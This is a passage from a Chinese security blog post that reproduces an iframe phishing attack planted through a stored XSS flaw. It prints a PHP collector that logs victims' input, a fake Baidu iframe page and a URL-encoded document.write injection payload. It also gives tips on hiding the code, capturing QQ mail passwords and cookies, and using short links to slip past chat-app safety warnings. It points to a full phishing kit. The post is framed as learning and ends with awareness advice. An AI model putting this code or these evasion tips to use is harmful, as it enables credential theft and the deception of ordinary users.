class="string">"dd"</span>&gt;</span></div><div class="line"> 	◎2018 Baidu <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>使用百度前必读<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>意见反馈<span class="tag">&lt;/<span class="name">a</span>&gt;</span>京ICP证030173号<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/jing01.png"</span> /&gt;</span> 京公网安备110000002000001号<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/jing01.png"</span>/&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line"> 	 </div><div class="line"> 	<span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>接收数据的baidu.php,接收了搜索的关键字wd以添加的方式写入baidu_search.txt并控制js跳转到真正搜索这个关键词的百度页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$wd = urlencode($_REQUEST[&apos;wd&apos;]);</div><div class="line">$log = fopen(&quot;baidu_search.txt&quot;, &quot;a&quot;);</div><div class="line">fwrite($log, $wd . &quot;\r\n&quot;);</div><div class="line">fclose($log);</div><div class="line"></div><div class="line">#echo $wd;</div><div class="line"></div><div class="line">echo &apos;&lt;script language=&quot;javascript&quot;&gt;&apos;;</div><div class="line">echo &quot;location.href=&apos;https://www.baidu.com/s?wd=&quot;.$wd.&quot;&amp;rsv_spt=1&amp;rsv_iqid=0xcd9013d50001ba80&amp;issp=1&amp;f=8&amp;rsv_bp=0&amp;rsv_idx=2&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;rsv_enter=1&amp;rsv_sug3=5&amp;rsv_sug1=2&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;inputT=805&amp;rsv_sug4=816&apos;&quot;;</div><div class="line">echo &apos;&lt;/script&gt;&apos;;</div><div class="line"></div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>百度页面目前的样子：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing11.png" alt=""></p>
<p>ps:其中baidu.html中用到的图片我放到github上面了 <a href="https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC" target="_blank" rel="external">https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC</a> </p>
<p>ps2:包括一个完整的qq邮箱前端后端钓鱼代码也写到了这个github目录里面，可以拿去学习，如果用于非法用途造成的后果与本人无关，展示效果如下：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing11-1.png" alt=""></p>
<p>至此环境搭建完成。</p>
<h2 id="0x04-复现-钓鱼过程"><a href="#0x04-复现-钓鱼过程" class="headerlink" title="0x04 复现-钓鱼过程"></a>0x04 复现-钓鱼过程</h2><p>我们要复现这个攻击过程需要将js代码写入这个存储型xss漏洞中，这个代码的功能需要做到将我们服务器的baidu.html通过iframe框架调用过来。</p>
<p>那么我们先写一个调用baidu.html的iframe.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span> </div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"https://www.baidu.com/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://www.baidu.com/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">body&#123;</span></div><div class="line">      margin:0px;</div><div class="line">	  border:0px;</div><div class="line">	  padding:0px;</div><div class="line">  &#125;</div><div class="line">iframe&#123;border:0px;</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/xss/hk/baidu.html"</span> <span class="attr">id</span>=<span class="string">"iframepage"</span> <span class="attr">name</span>=<span class="string">"iframepage"</span>  <span class="attr">width</span>=<span class="string">"101%"</span> <span class="attr">height</span>=<span class="string">"101%"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这个页面可以将伪造的百度页面整体拉到我们目前页面中。</p>
<p>想将他用到xss漏洞，需要先将iframe.html页面整个url编码一次。</p>
<p>然后将编码好的内容写到这个函数里，再整体写在刚才存在xss漏洞的留言页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;window.onload=function()&#123;document.write(decodeURI(&quot;%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv=%22Content-Type%22%20content=%22text/html;%20charset=utf-8%22%20/%3E%20%0A%3Ctitle%3E%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%BD%A0%E5%B0%B1%E7%9F%A5%E9%81%93%3C/title%3E%0A%3Clink%20rel=%22icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Clink%20rel=%22shortcut%20icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Cstyle%3Ebody%7B%0A%20%20%20%20%20%20margin:0px;%0A%09%20%20border:0px;%0A%09%20%20padding:0px;%0A%20%20%7D%0Aiframe%7Bborder:0px;%0A%7D%0A%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Ciframe%20src=%22http://127.0.0.1/xss/hk/baidu.html%22%20id=%22iframepage%22%20name=%22iframepage%22%20%20width=%22101%25%22%20height=%22101%25%22%20%3E%3C/iframe%3E%0A%3C/body%3E%0A%3C/html%3E&quot;))&#125;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing12.png" alt=""></p>
<p>下来我们将这个留言界面的网址，通过新浪短链接等工具生成一个短链接发送给别人，这里就发给我自己进行测试吧。</p>
<p>打开链接发现留言系统的页面已经变成了自己搭建好的伪造百度页面，但是网址还是存在xss漏洞的网址。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing13.png" alt=""></p>
<p>这个时候我们搜索：黑暗剑21</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing14.png" alt=""></p>
<p>然后就会发现跳转到了真正的百度搜索中，返回的词条也一致。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing15.png" alt=""></p>
<p>最后我们打开刚才存储数据的txt文件，发现多出一条 %E9%BB%91%E6%9A%97%E5%89%9121 </p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing16.png" alt=""></p>
<p>解码之后就是黑暗剑21。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing17.png" alt=""></p>
<p>至此我们一个完整的钓鱼流程就结束了。</p>
<h2 id="0x05-额外技巧"><a href="#0x05-额外技巧" class="headerlink" title="0x05 额外技巧"></a>0x05 额外技巧</h2><ul>
<li><p>如果我们不想让别人轻易从存在xss存储漏洞页面通过源代码轻易看出我们的目的，我们就需要通过代码混淆和加密的方式将代码伪造一番。</p>
</li>
<li><p>如果我们将伪造的页面换成qq邮箱，qq空间等用来钓鱼账号密码，那么就得将接收数据的php页面写成接收好数据保存，然后通过代理的方式向真正的页面提交请求，得到返回的cookie再跳转登陆。</p>
</li>
<li><p>要发给别人的钓鱼链接最好通过腾讯、新浪等公司提供的短链接生成器，这样不会在聊天窗口变成红色感叹号，甚至会变成绿色安全符号。</p>
</li>
</ul>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>网络钓鱼是最常见的盗号手段，对大部分具备网络安全意识的人很难起作用，但是如果这个网站制作的极其逼真，又是在一些知名公司挖到的存储型xss漏洞上布置的，很多人看到是正规的大公司域名，是不是就非常容易钓鱼成功呢？</p>
<p>所以面对不明链接的时候，要提升自己的安全意识，能不点则不点，更不要轻易输入账号密码和个人信息。</p>

  </section>
  <div class="copyright">
    <span>文本标题:</span><a href="/2018/05/21/分析并复现一次iframe框架钓鱼行为/" target="_blank">分析并复现一次iframe框架钓鱼行为</a><br />
    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
    <span>发布时间:</span>2018-05-21 20:55:29<br />
    <span>最后更新:</span>2018-05-22 15:40:33<br />
    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
  </div>
</article>
      <!-- footer panel -->
      <footer class="footer">
	<center>
    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
    </center>
</footer>
    </div>
  </div>
  <!-- js files -->
  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/js/main.js"></script>
  <script src="/js/scale.fix.js"></script>
  <script src="/js/tagcloud.js"></script>
  
  
	<script src="/js/jquery.fancybox.js"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			$(".fancybox").fancybox({
	            padding: 0,
	            helpers: {
	                overlay: {
	                  locked: false
	                }
	            }
	        });
		});
	</script>

  
    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript"> 
        $(document).ready(function(){
    MathJax.Hub.Config({ 
        tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
    });
});
    </script>

  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
  <script src="/js/gallery.js"></script>
  <script>
  $(document).ready(function(){
    hljs.initHighlightingOnLoad();
  });
  </script>
  
  
<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
</div>
<script>
    (function($) {
        var upperLimit = 100;
        var scrollElem = $('#totop');
        var scrollSpeed = 500;
        scrollElem.hide();
        $(window).scroll(function() {
            var scrollTop = $(document).scrollTop();
            if (scrollTop > upperLimit) {
                $(scrollElem).stop().fadeTo(300, 1); // fade back in
            } else {
                $(scrollElem).stop().fadeTo(300, 0); // fade out
            }
        });
        $(scrollElem).click(function() {
            $('html, body').animate({
                scrollTop: 0
            }, scrollSpeed);
            return false;
        });
    })(jQuery);
    </script>


  <!-- Analytics Google -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-83885261-1', 'auto');
  ga('send', 'pageview');
</script>
  
    <script src="/js/jquery.githubRepoWidget.min.js"></script>

  <!--kill ie6 -->
<!--[if IE 6]>
  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
<![endif]-->
</body>
</html>
